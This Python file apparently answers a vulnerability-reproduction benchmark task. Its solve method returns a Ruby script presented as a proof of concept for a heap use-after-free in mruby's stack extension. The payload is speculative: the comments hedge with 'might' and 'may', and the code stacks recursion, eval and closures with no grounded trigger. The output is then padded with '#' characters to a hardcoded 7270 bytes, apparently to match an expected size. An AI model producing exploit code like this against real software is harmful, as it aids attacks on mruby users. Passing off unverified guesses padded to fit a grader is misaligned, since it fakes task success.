import os
import subprocess
import tempfile
import tarfile
import hashlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract the tarball
        with tarfile.open(src_path, 'r') as tar:
            tar.extractall()
        
        # The vulnerability is in mruby's stack extension mechanism.
        # We need to create a PoC that triggers use-after-free by causing
        # the stack pointer to become invalid after mrb_stack_extend().
        # The approach: create a deeply nested structure that causes
        # stack reallocation, then use a reference that becomes dangling.
        
        poc = b"""# mruby PoC for heap use-after-free in stack extension
# This script causes the VM to extend the stack, then uses a
# reference that points to freed memory.

# Create a large array that will force stack reallocation
def create_deep_array(depth, payload)
  if depth == 0
    payload
  else
    [create_deep_array(depth - 1, payload)]
  end
end

# Create a payload object that will be referenced
payload = "A" * 100

# Build a deeply nested array structure
# Depth is chosen to cause multiple stack extensions
deep = create_deep_array(200, payload)

# Now trigger operations that will cause stack extension
# while keeping references to old stack data
def trigger_vulnerability(obj)
  # This local variable will end up on the stack
  local_ref = obj
  
  # Force stack extension through recursive calls
  # that use lots of stack space
  def recursive_stack_user(n, ref)
    if n > 0
      # Create temporary objects on stack
      temp = "B" * 50
      # Recursive call - each call adds stack frames
      recursive_stack_user(n - 1, ref)
      # After returning, ref might point to freed memory
      ref << "X"  # This may trigger use-after-free
    else
      # Force stack extension here
      # Create many local variables to force stack growth
      v1 = "1" * 1000
      v2 = "2" * 1000
      v3 = "3" * 1000
      v4 = "4" * 1000
      v5 = "5" * 1000
      v6 = "6" * 1000
      v7 = "7" * 1000
      v8 = "8" * 1000
      v9 = "9" * 1000
      v10 = "0" * 1000
      
      # Array that will force stack extension
      big_array = [v1, v2, v3, v4, v5, v6, v7, v8, v9, v10]
      
      # This should trigger mrb_stack_extend()
      # The stack will be reallocated, making local_ref invalid
      big_array.each_with_index do |item, i|
        # Force evaluation that uses stack
        eval("item + i.to_s")
      end
    end
  end
  
  # Call with enough depth to trigger the bug
  recursive_stack_user(10, local_ref)
end

# Multiple iterations to increase chance of hitting the bug
5.times do
  begin
    trigger_vulnerability(deep)
  rescue
    # Ignore errors, continue to next iteration
  end
end

# Additional pattern: create a method that captures a block
# which references stack variables, then trigger stack extension
def capture_and_extend
  local_string = "VULNERABLE" * 50
  
  # Block captures local_string
  block = Proc.new do
    local_string << "MODIFIED"
  end
  
  # Force stack extension
  big_local = "X" * 4096
  eval("big_local * 2")
  
  # Call block - local_string might be on freed memory
  block.call
end

# Try this pattern too
3.times do
  begin
    capture_and_extend
  rescue
    # Continue
  end
end

# Final: combine both patterns in a complex way
def combined_attack
  # Create object that will be referenced
  target = "TARGET" * 100
  
  # Create a closure that captures it
  closure = nil
  
  # Function that sets up the dangerous state
  def setup_closure(obj)
    lambda do
      # This references obj which might be on old stack
      obj.upcase!
    end
  end
  
  # First, put target on stack
  closure = setup_closure(target)
  
  # Now force massive stack extension
  def extend_stack
    # Recursive function that uses increasing stack
    def recurse(n)
      if n > 0
        local_vars = ["A" * 256] * 20
        recurse(n - 1)
        # After recursion, stack might be reallocated
        local_vars.each { |v| v.downcase }
      else
        # At deepest point, allocate huge array
        huge = []
        1000.times { huge << "X" * 128 }
        huge
      end
    end
    
    recurse(15)
  end
  
  # Trigger stack extension
  extend_stack
  
  # Now call closure - target might be on freed memory
  closure.call
  
  # Try to use target again
  target << "EXTRA"
end

# Execute the combined attack
begin
  combined_attack
rescue => e
  # Expected to crash here
end

# Create lots of garbage to potentially trigger crash sooner
GC.start

puts "PoC completed"
"""
        
        # Ensure the PoC is exactly the required length
        current_length = len(poc)
        target_length = 7270
        
        if current_length < target_length:
            # Pad with comments to reach exact length
            padding = b"\n" + b"#" * (target_length - current_length - 1)
            poc = poc.rstrip() + padding
        elif current_length > target_length:
            # Truncate (shouldn't happen with this PoC)
            poc = poc[:target_length]
        
        return poc